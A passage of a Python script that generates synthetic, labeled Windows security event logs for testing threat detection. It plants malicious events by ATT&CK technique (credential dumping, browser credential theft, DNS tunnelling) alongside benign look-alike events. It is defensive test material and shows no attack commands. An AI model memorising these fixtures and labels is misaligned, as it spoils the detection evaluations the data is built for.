        f"{_b64_payload(ctx.rng, 20).lower()}.cdn.cloudflare.net",
        f"settings-win.data.microsoft.com",
    ])
    ctx.out.append(_dns_event(
        ctx, when=when, host=host, user="SYSTEM",
        query_name=qname, query_type=ctx.rng.choice(["A", "HTTPS"]),
        image="C:\\Windows\\System32\\svchost.exe",
        label_near_miss=True,
    ))


def _near_miss_browser_data_copy(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Legitimate user backup of own profile data (rare but happens)."""
    image = "C:\\Windows\\System32\\xcopy.exe"
    src = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks"
    dst = f"D:\\Backup\\{user}\\bookmarks-{when.date().isoformat()}.bak"
    cmd = f'{image} "{src}" "{dst}" /Y'
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="xcopy.exe",
        command_line=cmd,
        parent_image=f"C:\\Users\\{user}\\Documents\\backup.bat",
        parent_command_line="backup.bat",
        label_near_miss=True,
    ))


# ---------------------------------------------------------------------------
# Driver
# ---------------------------------------------------------------------------


def populate_malicious(ctx: GenContext, start: datetime, end: datetime, n_per_technique: int) -> None:
    span = max(1, int((end - start).total_seconds()))

    def t() -> datetime:
        base = start + timedelta(seconds=ctx.rng.randint(0, span))
        return _biased_hour(ctx.rng, base, malicious=True)

    # Malicious targets can include DCs, servers, and workstations.
    def host_target() -> str:
        # Bias to workstations (more numerous) but include all
        if ctx.rng.random() < 0.85:
            return ctx.rng.choice(WORKSTATIONS)
        return ctx.rng.choice(SERVERS + DCS)

    for _ in range(n_per_technique):
        _plant_t1059_001(ctx, t(), host_target(), ctx.rng.choice(HUMAN_USERS + ADMIN_USERS))
        _plant_t1003_001(ctx, t(), host_target())
        _plant_t1218_005(ctx, t(), host_target(), ctx.rng.choice(HUMAN_USERS))
        _plant_t1053_005(ctx, t(), host_target(), ctx.rng.choice(HUMAN_USERS + ADMIN_USERS))
        _plant_t1547_001(ctx, t(), host_target(), ctx.rng.choice(HUMAN_USERS))
        # T1021.002 — pick two distinct hosts; allow a DC as destination occasionally
        all_targets = WORKSTATIONS + SERVERS + DCS
        src, dst = ctx.rng.sample(all_targets, 2)
        _plant_t1021_002(ctx, t(), src, dst, ctx.rng.choice(ADMIN_USERS + HUMAN_USERS))
        _plant_t1071_004(ctx, t(), host_target())
        _plant_t1555_003(ctx, t(), host_target(), ctx.rng.choice(HUMAN_USERS))


def populate_near_misses(ctx: GenContext, start: datetime, end: datetime, n_per_technique: int) -> None:
    """Plant benign-but-attack-shaped events. These are the FP surface."""
    span = max(1, int((end - start).total_seconds()))

    def t() -> datetime:
        base = start + timedelta(seconds=ctx.rng.randint(0, span))
        return _biased_hour(ctx.rng, base, malicious=False)

    near_miss_factories = [
        lambda: _near_miss_powershell_enc(ctx, t(), ctx.rng.choice(ALL_HOSTS)),
        lambda: _near_miss_schtasks(ctx, t(), ctx.rng.choice(ALL_HOSTS), ctx.rng.choice(HUMAN_USERS)),
        lambda: _near_miss_run_key(ctx, t(), ctx.rng.choice(WORKSTATIONS), ctx.rng.choice(HUMAN_USERS)),
        lambda: _near_miss_smb(ctx, t(), ctx.rng.choice(WORKSTATIONS), ctx.rng.choice(HUMAN_USERS)),
        lambda: _near_miss_rundll32(ctx, t(), ctx.rng.choice(WORKSTATIONS), ctx.rng.choice(HUMAN_USERS)),
        lambda: _near_miss_mshta(ctx, t(), ctx.rng.choice(WORKSTATIONS), ctx.rng.choice(HUMAN_USERS)),
        lambda: _near_miss_dns_long(ctx, t(), ctx.rng.choice(ALL_HOSTS)),
        lambda: _near_miss_browser_data_copy(ctx, t(), ctx.rng.choice(WORKSTATIONS), ctx.rng.choice(HUMAN_USERS)),
    ]
    for _ in range(n_per_technique):
        for factory in near_miss_factories:
            factory()


def generate(seed: int, total_events: int,
             malicious_per_technique: int = 8,
             near_miss_per_technique: int = 8) -> list[dict]:
    rng = random.Random(seed)
    ctx = GenContext(rng=rng)
    end = datetime(2026, 4, 28, tzinfo=timezone.utc)
    start = end - timedelta(days=7)

    populate_malicious(ctx, start, end, malicious_per_technique)
    malicious_n = len(ctx.out)
    populate_near_misses(ctx, start, end, near_miss_per_technique)
    fixture_n = len(ctx.out)
    if total_events <= fixture_n:
        raise SystemExit(
            f"--total ({total_events}) must exceed planted-event count "
            f"({fixture_n}: {malicious_n} malicious + {fixture_n - malicious_n} near-misses). "
            f"Try --total {fixture_n + 1000} or higher."
        )
    populate_benign(ctx, total_events - fixture_n, start, end)
    ctx.out.sort(key=lambda e: e["@timestamp"])
    return ctx.out


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--seed", type=int, default=42)
    p.add_argument("--total", type=int, default=5000,
                   help="Total events (default: 5000; minimum: 500)")
    p.add_argument("--out", type=Path, default=None)
    p.add_argument("--strip-labels", action="store_true",
                   help="Omit _labels — use when feeding events to LLM-side analysis")
    args = p.parse_args(argv)

    if args.total < 500:
        raise SystemExit("--total must be >= 500 (planted events alone use ~130)")

    events = generate(args.seed, args.total)

    if args.strip_labels:
        for ev in events:
            ev.pop("_labels", None)

    if args.out:
        with args.out.open("w") as f:
            for ev in events:
                f.write(json.dumps(ev, separators=(",", ":")))
                f.write("\n")
        labeled = sum(1 for e in events if e.get("_labels", {}).get("malicious"))
        nm = sum(1 for e in events if e.get("_labels", {}).get("near_miss"))
        print(f"Wrote {len(events)} events to {args.out}", file=sys.stderr)
        print(f"  Labeled malicious: {labeled} | Benign near-misses: {nm} | "
              f"Benign baseline: {len(events) - labeled - nm}", file=sys.stderr)
    else:
        for ev in events:
            sys.stdout.write(json.dumps(ev, separators=(",", ":")))
            sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
